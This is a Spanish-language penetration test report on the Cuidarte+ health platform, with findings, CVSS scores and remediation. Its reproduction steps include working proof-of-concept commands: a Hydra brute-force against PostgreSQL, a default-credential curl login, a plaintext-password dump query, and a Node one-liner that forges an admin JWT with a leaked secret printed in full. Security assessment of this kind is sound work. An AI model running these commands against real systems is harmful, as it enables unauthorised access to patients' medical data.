# Informe de Pruebas de Penetración — Cuidate+

Nov 21, 2026 · @juan

## 1. Portada y Control de Documento

| Campo | Detalle |
| :-- | :-- |
| **Título del Proyecto** | Prueba de Penetración Web y de Infraestructura — Cuidarte+ |
| **Cliente** | \[Nombre del Cliente / Cuidarte+\] |
| **Fecha de Ejecución** | 21 de noviembre de 2026 |
| **Versión del Informe** | 1.0 (Final) |
| **Clasificación** | CONFIDENCIAL — Distribución restringida |
| **Autor** | \[Tu Nombre / Jvaras\] — Consultor de Seguridad Ofensiva |
| **Revisor** | \[Nombre del Revisor\] |
| **Tipo de Prueba** | Caja Gris (Grey Box) |

## 2. Resumen Ejecutivo

**Calificación General de Riesgo: CRÍTICO**

Se realizó una prueba de penetración sobre la plataforma Cuidarte+ para evaluar la seguridad de sus aplicaciones web y la protección de los datos de salud que gestiona. La evaluación reveló fallos críticos que permiten a un atacante acceder a información médica sensible sin credenciales válidas.

### 2.1 Hallazgos por Severidad

| Severidad | Cantidad | Impacto General |
| :-- | :-: | :-- |
| **Crítica** | 6 | Compromiso total de la base de datos y bypass de autenticación |
| **Alta** | 1 | Configuraciones inseguras que facilitan ataques futuros |
| **Media** | 3 | Debilidades de configuración y falta de protecciones |
| **Baja** | 3 | Fugas de información menor y ausencia de buenas prácticas |

### 2.2 Los 3 Riesgos Críticos para el Negocio

**1. Robo Masivo de Datos de Salud:** Las contraseñas de la base de datos y de los usuarios están almacenadas en texto plano o son triviales (`admin:admin`). La base de datos PostgreSQL está expuesta en red con credenciales por defecto (`postgres:postgres`). Cualquier atacante con acceso a la red interna puede descargar el historial médico completo de los pacientes.

**2. Bypass Total de Autenticación:** El secreto para firmar tokens de sesión (JWT) está escrito directamente en el código fuente. Un atacante con acceso al repositorio puede fabricar un token de "Administrador" falso y acceder a todos los módulos del sistema (`/pacientes`, `/usuarios`, `/examenes`) sin autenticarse.

**3. Incumplimiento Normativo y Sanciones:** La explotación de estas vulnerabilidades constituye una brecha notificable bajo la **Ley 19.628** (Chile), exponiéndola a multas, sanciones regulatorias y daño reputacional irreversible dado el carácter sensible de los datos médicos comprometidos.

### 2.3 Recomendación Clave

**Acción inmediata (antes de 48 horas):** Rotar el secreto JWT comprometido, cifrar todas las contraseñas de usuarios con `bcrypt` (costo ≥ 12) y restringir el acceso a PostgreSQL para que no sea alcanzable desde la red pública.

## 3. Alcance y Metodología

### 3.1 Activos Evaluados

| Activo | Dirección | Tecnología |
| :-- | :-- | :-- |
| Frontend | `http://[IP_Objetivo]:3333` | Nginx + SPA |
| Backend / API | `http://[IP_Objetivo]:4444` | Node.js + Express |
| Base de Datos | `[IP_Objetivo]:15442` | PostgreSQL 15-alpine |

### 3.2 Exclusiones

- Infraestructura en la nube (AWS/Azure).
- Ataques de Ingeniería Social (Phishing).
- Red perimetral externa (Firewalls corporativos).

### 3.3 Metodología

La prueba se ejecutó bajo el estándar **PTES** (Penetration Testing Execution Standard). Se trató de una prueba de **Caja Gris (Grey Box)**: el equipo auditor tuvo acceso al código fuente y a los archivos de configuración (`docker-compose.yml`), lo que permitió un análisis profundo de la lógica de negocio y la gestión de secretos.

- **Ventana de tiempo:** \[Fecha de inicio\] al \[Fecha de fin\], fuera del horario de producción.
- **Limitaciones:** No se ejecutaron ataques de denegación de servicio (DoS) para no afectar la disponibilidad del ambiente.

### 3.4 Herramientas Utilizadas

| Herramienta | Versión | Propósito |
| :-- | :-- | :-- |
| **Nmap** | 7.9x | Descubrimiento de puertos y servicios |
| **Nikto** | 2.6.1 | Escaneo de vulnerabilidades web y cabeceras HTTP |
| **Hydra** | 9.7 | Fuerza bruta de credenciales (PostgreSQL) |
| **Python (Requests)** | 3.x | Automatización de fuerza bruta en API JSON |
| **Curl** | 8.x | Verificación manual de endpoints y PoCs |
| **Node.js (jsonwebtoken)** | 20.x | Forja de tokens JWT (Prueba de Concepto) |

## 4. Resumen de Hallazgos

| ID | Título | Severidad | CVSS | Categoría | Estado |
| :-- | :-- | :-- | :-: | :-- | :-- |
| **H-01** | Contraseñas en texto plano en BD | **Crítica** | 9.8 | CWE-256 / OWASP A02 | Abierto |
| **H-02** | Credenciales triviales (`admin:admin`) | **Crítica** | 9.8 | CWE-521 / OWASP A07 | Abierto |
| **H-03** | JWT Secret hardcodeado en repositorio | **Crítica** | 9.1 | CWE-798 / OWASP A07 | Abierto |
| **H-04** | Bypass de autenticación mediante JWT forjado | **Crítica** | 9.8 | CWE-347 / OWASP A01 | Abierto |
| **H-05** | PostgreSQL expuesto con credenciales por defecto | **Crítica** | 9.8 | CWE-284 / OWASP A05 | Abierto |
| **H-06** | Exposición de datos médicos sensibles | **Crítica** | 9.1 | CWE-359 / OWASP A02 | Abierto |
| **H-07** | Fallback de JWT inseguro (`"inseguro"`) | **Alta** | 8.1 | CWE-1188 / OWASP A05 | Abierto |
| **H-08** | Sin rate limiting en `/login` | Media | 5.3 | CWE-307 / OWASP A07 | Abierto |
| **H-09** | Política CORS permisiva (`*`) | Media | 5.3 | CWE-942 / OWASP A05 | Abierto |
| **H-10** | Servicios expuestos en `0.0.0.0` | Media | 5.3 | CWE-1327 / OWASP A05 | Abierto |
| **H-11** | Endpoint `/roles` sin autenticación | Baja | 3.7 | CWE-306 / OWASP A01 | Abierto |
| **H-12** | Fuga de información `X-Powered-By` | Baja | 3.1 | CWE-200 / OWASP A05 | Abierto |
| **H-13** | Ausencia de cabeceras de seguridad | Baja | 4.3 | CWE-693 / OWASP A05 | Abierto |

## 5. Hallazgos Detallados

---

### H-01 — Contraseñas en Texto Plano en Base de Datos

- **Severidad:** Crítica | **CVSS:** 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Categoría:** CWE-256 | OWASP A02:2021-Cryptographic Failures
- **Sistema afectado:** PostgreSQL `[IP_Objetivo]:15442`, tabla `usuarios`

**Descripción:** Las contraseñas de todos los usuarios se almacenan sin ningún hash ni cifrado.

**Impacto:** Un atacante con acceso de lectura a la BD (por SQL Injection o acceso directo como en H-05) obtiene las credenciales en claro de todos los usuarios, incluyendo administradores.

**Pasos para reproducir:**

1. Conectarse a la base de datos PostgreSQL.
2. Ejecutar: `SELECT id, nombre_usuario, contrasena FROM usuarios;`

**Evidencia:**

```sql
cuidarteplus=# SELECT id, nombre_usuario, contrasena FROM usuarios;
 id | nombre_usuario | contrasena
----+----------------+------------
  1 | admin          | admin
  2 | medico         | medico
  3 | paciente       | paciente
```

**Remediación:** Implementar hashing con `bcrypt` (costo ≥ 12) o `argon2id` en el backend antes de persistir en BD. Forzar cambio de contraseña a todos los usuarios existentes en el próximo login.

**Referencias:** [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

---

### H-02 — Credenciales por Defecto / Triviales

- **Severidad:** Crítica | **CVSS:** 9.8
- **Categoría:** CWE-521 | OWASP A07:2021-Identification and Authentication Failures
- **Sistema afectado:** API Backend `[IP_Objetivo]:4444` → endpoint `/login`

**Descripción:** Los usuarios del sistema tienen contraseñas idénticas a su nombre de usuario (`admin:admin`, `medico:medico`, `paciente:paciente`), que además están en texto plano (H-01).

**Impacto:** Acceso inmediato a cualquier rol del sistema con un ataque de diccionario trivial o simplemente por prueba manual.

**Pasos para reproducir:**

1. Enviar petición POST al endpoint de login con credenciales por defecto.
2. `curl -X POST http://[IP_Objetivo]:4444/login -H "Content-Type: application/json" -d '{"nombreUsuario":"admin","contrasena":"admin"}'`

**Remediación:** Aplicar H-01. Implementar política de contraseñas robusta (mínimo 12 caracteres, complejidad). Invalidar todas las sesiones activas y forzar cambio de credenciales.

---

### H-03 — JWT Secret Hardcodeado en Repositorio

- **Severidad:** Crítica | **CVSS:** 9.1 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Categoría:** CWE-798 | OWASP A07:2021-Identification and Authentication Failures
- **Sistema afectado:** Archivos `.env` y `BACKEND/.env`

**Descripción:** El secreto criptográfico utilizado para firmar y verificar los tokens JWT está almacenado en texto plano dentro del repositorio de código.

**Impacto:** Cualquier persona con acceso al repositorio (empleados, forks, backups expuestos, ex-colaboradores) puede generar tokens de sesión válidos para cualquier usuario, saltándose el login por completo.

**Pasos para reproducir:**

1. `grep -rniE "JWT_SECRET" .`

**Evidencia:**

```bash
./BACKEND/.env:3:JWT_SECRET=0d1d8132f0fde5beabb417b434ff10f1cae8635a461686b0f46ac9c2bbfbd0e8
./.env:1:JWT_SECRET=0d1d8132f0fde5beabb417b434ff10f1cae8635a461686b0f46ac9c2bbfbd0e8
```

**Remediación:** Rotar el secreto inmediatamente. Eliminar archivos `.env` del repositorio y agregar `*.env` al `.gitignore`. Usar un gestor de secretos (HashiCorp Vault, AWS Secrets Manager) o variables de entorno inyectadas por el orquestador. Invalidar todos los tokens activos.

**Referencias:** [CWE-798](https://cwe.mitre.org/data/definitions/798.html)

---

### H-04 — Bypass de Autenticación mediante JWT Forjado

- **Severidad:** Crítica | **CVSS:** 9.8
- **Categoría:** CWE-347 | OWASP A01:2021-Broken Access Control
- **Sistema afectado:** Rutas `/pacientes`, `/usuarios`, `/examenes`, `/auditoria`

**Descripción:** Conociendo el secreto JWT (H-03), es posible forjar un token con `usuarioId: "1"` (admin) y obtener acceso a todos los endpoints protegidos sin ninguna credencial real.

**Impacto:** Acceso total a información de pacientes y administración del sistema. Un atacante puede leer, modificar y eliminar datos médicos sensibles.

**Pasos para reproducir:**

1. Generar token forjado con el secreto filtrado:

```bash
FORGED=$(node -e "console.log(require('jsonwebtoken').sign({usuarioId:'1', nombreUsuario:'admin'},'0d1d8132f0fde5beabb417b434ff10f1cae8635a461686b0f46ac9c2bbfbd0e8'))")
```

2. Realizar petición al endpoint protegido:

```bash
curl -s -o /dev/null -w "%{http_code}" http://[IP_Objetivo]:4444/pacientes -H "Authorization: Bearer $FORGED"
```

**Evidencia:**

```text
/pacientes  → 200 OK  (con token forjado)
/pacientes  → 401 Unauthorized (sin token)
```

**Remediación:** Aplicar H-03. Implementar revocación de tokens con `tokenVersion` en BD (se incrementa al cambiar contraseña/rol y se valida en el middleware JWT).

**Referencias:** [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

### H-05 — PostgreSQL Expuesto con Credenciales por Defecto

- **Severidad:** Crítica | **CVSS:** 9.8
- **Categoría:** CWE-284 | OWASP A05:2021-Security Misconfiguration
- **Sistema afectado:** `[IP_Objetivo]:15442`

**Descripción:** El contenedor de PostgreSQL está publicado en `0.0.0.0` (accesible desde cualquier interfaz) y utiliza las credenciales por defecto `postgres:postgres`.

**Impacto:** Cualquier equipo en la misma red puede conectarse directamente a la base de datos y extraer, modificar o destruir toda la información del sistema.

**Pasos para reproducir:**

1. Fuerza bruta con diccionario (o prueba directa):

```bash
hydra -l postgres -p postgres localhost -s 15442 postgres -V
```

**Evidencia:**

```text
[15442][postgres] host: localhost   login: postgres   password: postgres
1 valid password found
```

**Remediación:** Cambiar la contraseña a una robusta (≥ 20 caracteres, aleatoria). Modificar `docker-compose.yml` para exponer el puerto solo en localhost: `127.0.0.1:15442:5432` en lugar de `0.0.0.0:15442:5432`.

**Referencias:** [CIS PostgreSQL Benchmark](https://www.cisecurity.org/benchmark/postgresql)

---

### H-06 — Exposición de Datos Médicos Sensibles

- **Severidad:** Crítica | **CVSS:** 9.1
- **Categoría:** CWE-359 | OWASP A02:2021-Cryptographic Failures
- **Sistema afectado:** Endpoints autenticados `/pacientes`, `/examenes`

**Descripción:** La combinación de H-03 + H-04 permite a un atacante no autenticado acceder al historial médico completo de los pacientes mediante un token JWT forjado.

**Impacto:** Vulneración directa de la privacidad de los pacientes. Los datos expuestos incluyen diagnósticos, resultados de exámenes y datos personales de salud, constituyendo una brecha notificable bajo Ley 19.628.

**Remediación:** Aplicar H-01, H-03, H-04. Implementar control de acceso basado en roles (RBAC) con verificación en el middleware. Auditar todos los accesos a datos médicos.

---

### H-07 — Fallback de JWT Inseguro (`"inseguro"`)

- **Severidad:** Alta | **CVSS:** 8.1
- **Categoría:** CWE-1188 | OWASP A05:2021-Security Misconfiguration
- **Sistema afectado:** 7 archivos de rutas en `BACKEND/src/routes/`

**Descripción:** El código usa `process.env.JWT_SECRET || "inseguro"`. Si la variable de entorno falta (despliegue en nuevo servidor sin configurar), la aplicación utiliza la palabra `"inseguro"` como secreto.

**Impacto:** En un despliegue fallido o incompleto, el sistema es completamente vulnerable a forja de tokens con una clave trivial conocida.

**Pasos para reproducir:**

1. `grep -rn "inseguro" BACKEND/src/routes/`

**Evidencia:**

```javascript
const JWT_SECRET = process.env.JWT_SECRET || "inseguro";
```

**Remediación:** Eliminar el fallback. Si la variable no existe, el proceso debe detenerse con error fatal:

```javascript
if (!process.env.JWT_SECRET) throw new Error("FATAL: JWT_SECRET not set");
```

## 6. Apéndices

### Apéndice A — Hallazgos de Severidad Media y Baja

| ID | Severidad | Descripción | Remediación |
| :-- | :-- | :-- | :-- |
| **H-08** | Media | Sin rate limiting en `/login`. Se realizaron 10,000 peticiones en 33 segundos. | Implementar `express-rate-limit` |
| **H-09** | Media | CORS configurado con `*`. Permite a dominios externos leer respuestas de la API. | Restringir a dominios corporativos |
| **H-10** | Media | API (`:4444`) y BD (`:15442`) publicadas en `0.0.0.0`. | Restringir a `localhost` o red interna Docker |
| **H-11** | Baja | `/roles` devuelve roles del sistema sin requerir autenticación. | Agregar middleware de autenticación |
| **H-12** | Baja | Cabecera `X-Powered-By: Express` detectada por Nikto. | `app.disable('x-powered-by')` |
| **H-13** | Baja | Faltan cabeceras de seguridad (CSP, HSTS, X-Frame-Options). | Implementar `helmet()` en Express |

---

### Apéndice B — Diagrama de Topología Descubierta

```text
[ Red del Atacante ]
       |
       v
[ IP Kali: 10.15.238.186 ]
       |
       |--- (Puerto 3333/TCP) ---> [ Frontend Nginx ]
       |
       |--- (Puerto 4444/TCP) ---> [ API Node.js/Express ] ---> (Red Docker Interna) ---> [ PostgreSQL ]
       |
       |--- (Puerto 15442/TCP) --> [ PostgreSQL Expuesto ← Acceso Directo ]
```

**Observación crítica:** El puerto `15442` de PostgreSQL está expuesto directamente a la red del atacante, saltándose la capa de aplicación y cualquier control de acceso del backend.

---

### Apéndice C — Glosario de Términos

| Término | Definición |
| :-- | :-- |
| **CVE** | Identificador único para vulnerabilidades conocidas públicamente |
| **CVSS** | Sistema de puntuación de 0 a 10 que mide la gravedad de una vulnerabilidad |
| **CWE** | Clasificación de debilidades de software (ej. CWE-256: almacenamiento en texto plano) |
| **JWT** | JSON Web Token: token de sesión firmado. Si el secreto se filtra, se puede falsificar |
| **Rate Limiting** | Mecanismo para limitar peticiones por unidad de tiempo y evitar fuerza bruta |
| **OWASP Top 10** | Lista de los 10 riesgos más críticos en aplicaciones web |
| **PTES** | Penetration Testing Execution Standard: metodología estándar para pentesting |
| **Caja Gris** | Modalidad de prueba donde el auditor tiene acceso parcial al código o arquitectura |
| **bcrypt** | Algoritmo de hashing de contraseñas diseñado para ser lento y resistente a fuerza bruta |
| **RBAC** | Role-Based Access Control: control de acceso basado en roles |

---

*Fin del informe. La información contenida en este documento es confidencial y su divulgación no autorizada está prohibida. Los marcadores `[Entre corchetes]` deben ser completados con los datos reales del proyecto antes de su entrega al cliente.*
